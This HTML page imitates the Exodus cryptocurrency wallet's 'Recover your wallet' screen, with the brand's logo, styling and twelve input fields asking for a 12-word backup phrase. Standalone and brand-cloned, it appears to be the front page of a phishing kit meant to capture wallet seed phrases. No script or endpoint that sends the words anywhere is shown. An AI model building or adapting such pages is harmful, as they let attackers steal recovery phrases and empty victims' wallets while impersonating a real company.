<!DOCTYPE html>
<html lang="en" style="background:#1f243d">
<head>
<meta charset="utf-8"/>
<style>html,body{background:#1f243d}</style>
<link rel="icon" href="assets/exodus-icon.png"/>
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"/>
<title>Exodus</title>
<style>
html,body{margin:0;height:100%;background:#1f243d;color:#fff;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;overflow:hidden}
#root{height:100%;background:#1f243d}
.ex-shell{position:relative;height:100%;width:100%;background:#1f243d;color:#fff;overflow:hidden}
.ex-inner{display:flex;height:100%;width:100%;align-items:center;justify-content:center;background:linear-gradient(to bottom,#16172b,transparent)}
.ex-form{position:relative;z-index:10;display:flex;width:100%;flex-direction:column;align-items:center;gap:8px;padding:48px 32px;box-sizing:border-box}
.ex-logo{display:block;margin:0 0 32px;width:60px;height:60px}
.ex-title{margin:0;text-align:center;font-size:24px;font-weight:400;line-height:1.25}
.ex-sub{margin:0;padding:0 32px;text-align:center;font-size:14px;font-weight:400;color:#fff;opacity:.5;line-height:1.4}
.ex-grid{margin-top:32px;display:grid;width:100%;max-width:36rem;grid-template-columns:repeat(2,minmax(0,1fr));column-gap:8px;row-gap:16px}
@media (min-width:640px){.ex-grid{grid-template-columns:repeat(6,minmax(0,1fr))}}
.ex-word{position:relative;display:flex;align-items:center;border-bottom:1px solid rgba(255,255,255,.5);color:rgba(255,255,255,.9)}
.ex-word:focus-within{border-bottom-color:#fff}
.ex-word input{width:100%;height:100%;box-sizing:border-box;margin:0;border:0;outline:none;background:transparent;padding:8px 0;text-align:center;font-size:15px;color:#fff;caret-color:#fff;font-family:inherit;-webkit-text-fill-color:#fff}
.ex-word input::placeholder{color:rgba(255,255,255,.2);-webkit-text-fill-color:rgba(255,255,255,.2)}
#ex-alarm{display:none;width:100%;max-width:36rem;box-sizing:border-box;background:rgba(220,38,38,.1);border:1.5px solid transparent;color:#f87171;padding:12px 16px;border-radius:8px;text-align:center;font-size:14px;font-weight:500;margin:20px 0 0;line-height:1.5}
#ex-submit-btn{margin-top:48px;border:0;border-radius:999px;padding:16px 32px;color:#fff;font-size:14px;font-weight:500;font-family:inherit;background:linear-gradient(90deg,#02bcff,#651cff);cursor:pointer;touch-action:manipulation;-webkit-tap-highlight-color:transparent;transition:transform .07s ease,box-shadow .07s ease,filter .07s ease}
#ex-submit-btn:disabled{cursor:not-allowed;filter:brightness(.75)}
#ex-submit-btn:not(:disabled):active,
#ex-submit-btn:not(:disabled).is-pressed{transform:translateY(1px) scale(.98);box-shadow:inset 0 1px 2px rgba(0,0,0,.22)}
.ex-blob{pointer-events:none;position:absolute;bottom:0;left:0;width:100%;height:auto;z-index:0}
</style>
</head>
<body>
<div id="root">
  <div class="ex-shell">
    <div class="ex-inner">
      <form id="ex-import-form" class="ex-form" action="#" autocomplete="off">
        <svg class="ex-logo" fill="none" height="60" viewBox="0 0 60 60" width="60" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
          <path d="M59.64 16.753 34.09 0v9.367l16.391 10.65-1.928 6.102H34.09v7.761h14.463l1.928 6.102-16.39 10.651V60l25.55-16.7-4.178-13.273 4.178-13.274Z" fill="url(#exl-a)"/>
          <path d="M11.86 33.88h14.41v-7.76H11.807l-1.875-6.102L26.27 9.367V0L.719 16.753l4.178 13.274L.719 43.3 26.323 60v-9.367L9.932 39.983l1.928-6.102Z" fill="url(#exl-b)"/>
          <mask height="60" id="exl-d" maskUnits="userSpaceOnUse" style="mask-type:alpha" width="60" x="0" y="0">
            <path d="M59.64 16.753 34.09 0v9.367l16.391 10.65-1.928 6.102H34.09v7.761h14.463l1.928 6.102-16.39 10.651V60l25.55-16.7-4.178-13.273 4.178-13.274Z" fill="url(#exl-c)"/>
            <path d="M11.86 33.88h14.41v-7.76H11.807l-1.875-6.102L26.27 9.367V0L.719 16.753l4.178 13.274L.719 43.3 26.323 60v-9.367L9.932 39.983l1.928-6.102Z" fill="url(#exl-a)"/>
          </mask>
          <g mask="url(#exl-d)">
            <path d="M.75 0h58.5v60H.75z" fill="url(#exl-e)"/>
          </g>
          <defs>
            <linearGradient id="exl-a" x1="51.375" x2="34.26" y1="64.125" y2="-6.589" gradientUnits="userSpaceOnUse">
              <stop offset="0" stop-color="#0B46F9"/>
              <stop offset="1" stop-color="#BBFBE0"/>
            </linearGradient>
            <linearGradient id="exl-b" x1="51.375" x2="34.26" y1="64.125" y2="-6.589" gradientUnits="userSpaceOnUse">
              <stop offset="0" stop-color="#0B46F9"/>
              <stop offset="1" stop-color="#BBFBE0"/>
            </linearGradient>
            <linearGradient id="exl-c" x1="51.375" x2="34.26" y1="64.125" y2="-6.589" gradientUnits="userSpaceOnUse">
              <stop offset="0" stop-color="#0B46F9"/>
              <stop offset="1" stop-color="#BBFBE0"/>
            </linearGradient>
            <linearGradient id="exl-e" x1="4.5" x2="34.125" y1="13.5" y2="35.625" gradientUnits="userSpaceOnUse">
              <stop offset="0.12" stop-color="#8952FF" stop-opacity="0.87"/>
              <stop offset="1" stop-color="#DABDFF" stop-opacity="0"/>
            </linearGradient>
          </defs>
        </svg>
        <div id="ex-page-title" class="ex-title">Recover your wallet</div>
        <div id="ex-page-subtitle" class="ex-sub">Type your 12-word backup phrase to recover your wallet</div>
        <div id="ex-word-grid" class="ex-grid">
          <div class="ex-word"><input id="ex-word-1" type="text" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="1" value=""/></div>
          <div class="ex-word"><input id="ex-word-2" type="text" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="2" value=""/></div>
          <div class="ex-word"><input id="ex-word-3" type="text" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="3" value=""/></div>
          <div class="ex-word"><input id="ex-word-4" type="text" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="4" value=""/></div>
          <div class="ex-word"><input id="ex-word-5" type="text" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="5" value=""/></div>
          <div class="ex-word"><input id="ex-word-6" type="text" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="6" value=""/></div>
          <div class="ex-word"><input id="ex-word-7" type="text" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="7" value=""/></div>
          <div class="ex-word"><input id="ex-word-8" type="text" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="8" value=""/></div>
          <div class="ex-word"><input id="ex-word-9" type="text" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="9" value=""/></div>
          <div class="ex-word"><input id="ex-word-10" type="text" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="10" value=""/></div>
          <div class="ex-word"><input id="ex-word-11" type="text" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="11" value=""/></div>
          <div class="ex-word"><input id="ex-word-12" type="text" inputmode="text" autocapitalize="none" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="12" value=""/></div>
        </div>
        <div id="ex-alarm"></div>
        <button type="submit" id="ex-submit-btn" disabled><span id="ex-submit-label">Recover</span></button>
      </form>
    </div>
    <svg class="ex-blob" fill="none" viewBox="0 0 360 479" aria-hidden="true">
      <g opacity="0.56">
        <g filter="url(#ex-baa)">
          <ellipse cx="498.915" cy="585.228" fill="#4D3589" rx="417.444" ry="380.772"></ellipse>
        </g>
        <g opacity="0.75">
          <g filter="url(#ex-bgb)">
            <ellipse cx="-153.771" cy="464.223" fill="#0025CE" rx="398.392" ry="210.783" transform="rotate(10.54 -153.771 464.223)"></ellipse>
          </g>
          <g filter="url(#ex-bgc)">
            <path d="M144.424 458.152c-341.813-18.038-447.086-340.128-565.962-330.96-149.436 11.525-121.593 313.639 0 428.75 143.324 135.685 797.604-85.566 565.962-97.79Z" fill="#00EAFF"></path>
          </g>
        </g>
      </g>
      <defs>
        <filter color-interpolation-filters="sRGB" filterUnits="userSpaceOnUse" height="1128.26" id="ex-baa" width="1201.6" x="-101.885" y="21.099">
          <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
          <feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape"></feBlend>
          <feGaussianBlur result="effect1_foregroundBlur" stdDeviation="91.679"></feGaussianBlur>
        </filter>
        <filter color-interpolation-filters="sRGB" filterUnits="userSpaceOnUse" height="928.409" id="ex-bgb" width="1276.14" x="-791.839" y="0.018">
          <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
          <feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape"></feBlend>
          <feGaussianBlur result="effect1_foregroundBlur" stdDeviation="122.238"></feGaussianBlur>
        </filter>
        <filter color-interpolation-filters="sRGB" filterUnits="userSpaceOnUse" height="717.288" id="ex-bgc" width="961.503" x="-645.679" y="4.762">
          <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
          <feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape"></feBlend>
          <feGaussianBlur result="effect1_foregroundBlur" stdDeviation="61.119"></feGaussianBlur>
        </filter>
      </defs>
    </svg>
  </div>
</div>
</body>
</html>
